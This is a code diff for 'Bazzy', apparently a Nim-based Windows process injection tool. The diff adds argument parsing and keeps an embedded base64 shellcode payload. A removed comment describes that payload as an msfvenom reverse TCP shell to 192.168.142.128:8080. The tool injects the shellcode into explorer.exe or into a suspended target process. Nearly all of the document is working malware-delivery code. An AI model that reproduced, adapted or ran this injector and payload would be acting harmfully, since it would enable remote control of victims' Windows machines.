@@ -1,7 +1,7 @@
-import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils, strformat
+import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils, strformat, os
 import winim/inc/tlhelp32
 import createSuspendedProcess
-
+import parseopt 
 
 proc getExplorerPID(): DWORD =
   var 
@@ -125,7 +125,6 @@ proc injectShellcode(shellcode: openarray[byte], pid: DWORD = 0): void =
         CloseHandle(hThread)
     VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
     CloseHandle(hProcess)
-        
 
 proc executeShellcode(shellcode: openarray[byte]): void = 
 
@@ -147,10 +146,55 @@ proc executeShellcode(shellcode: openarray[byte]): void =
         0,
         cast[GEO_ENUMPROC](rPtr)
     ) 
+proc showHelp() =
+    echo """
+Bazzy - Process Injection Tool
 
-# This base64 blob was generated with msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.142.128 LPORT=8080 -f raw -o reverse.bin
+Usage:
+    bazzy [options]
 
-let base64Str = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
+Options:
+    -h, --help                Show this help
+    -p, --payload <base64>    Base64 encoded shellcode payload
+    -t, --target <process>    Target process name (default: explorer.exe)
+    
+Examples:
+    bazzy --payload <base64string>                 # Inject into explorer.exe
+    bazzy -p <base64string> -t notepad.exe        # Inject into suspended notepad.exe
+    """
+    quit(0)
+
+# Main execution
+var 
+    payload = ""
+    targetProcess = ""
+    processId: DWORD
+    procHandle: HANDLE
+    threadHandle: HANDLE
+
+# Parse command line arguments
+var p = initOptParser(commandLineParams())
+while true:
+    p.next()
+    case p.kind
+    of cmdEnd: break
+    of cmdShortOption, cmdLongOption:
+        case p.key.toLower()
+        of "help", "h": 
+            showHelp()
+        of "payload", "p":
+            p.next()
+            payload = p.key
+        of "target", "t":
+            p.next()
+            targetProcess = p.key
+    of cmdArgument:
+        echo "Unknown argument: ", p.key
+        showHelp()
+
+# If no payload provided, use default
+if payload == "":
+    payload = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
 yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
 TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
 QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnl
@@ -158,42 +202,40 @@ SbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInC
 SP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBI
 ieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6
 ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlB
-idr/1Q==
-"""  
-var
-    processId: DWORD
-    procHandle: HANDLE
-    threadHandle: HANDLE
+idr/1Q==""" 
 
-let decodedData = decode(base64Str)
+let decodedData = decode(payload)
 echo "decoded:", decodedData
 echo decodedData.len
-var buf: array[1642, byte] # is it 316
+var buf: array[1642, byte]
 copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
 
-# pop msgbox
-let csp = createSuspendedProcess(
-        "notepad.exe",
+# Process injection logic
+if targetProcess != "":
+    # Use suspended process injection
+    let csp = createSuspendedProcess(
+        targetProcess,
         addr processId,
         addr procHandle,
         addr threadHandle
     )
 
-if csp:
-    echo fmt"""
-        Process Details:
-        ---------------
-        PID: {processId}
-        Process Handle: {procHandle}
-        Thread Handle: {threadHandle}
-        """
-    echo ".oO injecting thread into suspended process Oo."
-    injectShellcode(buf, processId)
-    echo ".oO Resuming process Oo."
+    if csp:
+        echo fmt"""
+            Process Details:
+            ---------------
+            PID: {processId}
+            Process Handle: {procHandle}
+            Thread Handle: {threadHandle}
+            """
+        echo ".oO injecting thread into suspended process Oo."
+        injectShellcode(buf, processId)
+        echo ".oO Resuming process Oo."
 
-    discard resumeThread(threadHandle)
-# executeShellcode(buf)
-
-
+        discard resumeThread(threadHandle)
+else:
+    # Default to explorer.exe injection
+    echo ".oO Defaulting to explorer.exe injection Oo."
+    injectShellcode(buf)
 
 echo "Success!"
